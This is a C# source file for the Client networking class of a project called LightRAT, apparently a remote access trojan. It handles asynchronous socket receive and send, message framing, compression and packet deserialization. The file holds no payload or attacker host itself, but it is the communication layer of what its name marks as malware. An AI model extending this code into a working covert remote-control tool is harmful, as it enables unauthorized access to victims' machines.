using System;
using System.IO;
using System.Net.Sockets;
using System.Threading.Tasks;
using LightRAT.Engine;
using LightRAT.Network.Protocol;
using LightRAT.Network.Packets;
using LightRAT.Network;
using LightRAT.Network.EventArgs;

namespace LightRAT.Network
{
    public class Client : IDisposable
    {
        private MessageFramingProtocol _protocol = new MessageFramingProtocol(NetworkSizes.MaxPacketSize);
        private byte[] _receivingBuffer = new byte[NetworkSizes.BufferSize];

        public Socket ClientSocket { get; private set; }
        public bool IsDisposed { get; private set; }
        public bool IsConnected => !(ClientSocket.Poll(1000, SelectMode.SelectRead) && ClientSocket.Available == 0);

        public event EventHandler<ReceivePacketArgs> OnPacketReceive;
        public event EventHandler OnDisconnect;

        public Client(Socket socket)
        {
            ClientSocket = socket;
            _protocol.DataReceivedEvent += MessageFraming_DataReceivedEvent;
        }
        private async Task MessageFraming_DataReceivedEvent(byte[] receivedData)
        {
            IPacket packet;

            using (var ms = new MemoryStream(await CryptEngine.DecompressAsync(receivedData)))
                packet = (IPacket) await LightRATUtils.Instance.packetSerializer.DeserializeAsync(ms);

            OnPacketReceive?.Invoke(this, new ReceivePacketArgs(packet));
        }

        public void StartReceive() => ClientSocket.BeginReceive 
        (
            _receivingBuffer,
            0,
            _receivingBuffer.Length,
            SocketFlags.None,
            ReceiveCallback,
            null 
         );


        private void ReceiveCallback(IAsyncResult result)
        {
            try
            {
                _protocol.ReadAsync(_receivingBuffer).GetAwaiter();
                Array.Clear(_receivingBuffer, 0, _receivingBuffer.Length);
                ClientSocket.BeginReceive(_receivingBuffer, 0, _receivingBuffer.Length, SocketFlags.None, ReceiveCallback, null);
            }
            catch (SocketException)
            {
                if(IsConnected)
                    ClientSocket.BeginReceive(_receivingBuffer, 0, _receivingBuffer.Length, SocketFlags.None, ReceiveCallback, null);

                OnDisconnect?.Invoke(this, null);
            }
        }

        public async Task SendPacket(IPacket packet)
        {
            byte[] buffer;

            using (var ms = new MemoryStream())
            {
                await LightRATUtils.Instance.packetSerializer.SerializeAsync(ms, packet);
                buffer = ms.ToArray();
            }

            var compressedData = await CryptEngine.CompressAsync(buffer);
            var framedData = await MessageFramingProtocol.FrameAsync(compressedData);

            ClientSocket.BeginSend(framedData, 0, framedData.Length, SocketFlags.None, SendCallback, null);
        }
        private void SendCallback(IAsyncResult result)
        {
            ClientSocket.EndSend(result);
        }

        public void Dispose()
        {
            if (!IsDisposed)
            {
                _receivingBuffer = null;
                _protocol.DataReceivedEvent -= MessageFraming_DataReceivedEvent;
                _protocol = null;
                ClientSocket.Dispose();
                ClientSocket = null;
                IsDisposed = true;
            }
        }
    }
}
